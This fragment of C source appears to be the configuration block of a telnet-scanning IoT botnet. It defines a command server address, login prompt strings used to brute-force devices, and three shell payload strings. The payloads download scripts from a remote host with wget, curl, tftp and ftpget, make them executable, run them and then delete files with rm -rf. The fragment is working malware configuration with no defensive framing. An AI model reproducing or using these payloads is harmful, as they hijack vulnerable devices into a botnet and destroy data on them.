...
// CONFIG
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = { "192.168.1.4:23" };
char* phone[] = {":", "ogin", "sername", "assword", "Linux", "9615-cdp", (char*)0};
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.168.1.4/bins.sh; curl -O http://192.168.1.4/bins.sh; /bin/busybox wget http://192.168.1./bin.sh; /bin/busybox tftp 192.168.1.4 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 192.168.1.4-c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 192.168.1.4; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 192.168.1.4 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\r\n"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp; rm -rf *; cd /tmp/; wget http://192.168.1.4/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://192.168.1.4/bins.sh; sh bins.sh; rm -rf bins.sh"; //Normal Payload Without busybox Implemented.
char *phonepayload = "cd /tmp; rm -rf *; cd /tmp/; wget http://192.168.1.4/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://192.168.1.4/bins.sh; sh bins.sh; rm -rf bins.sh\r\n";
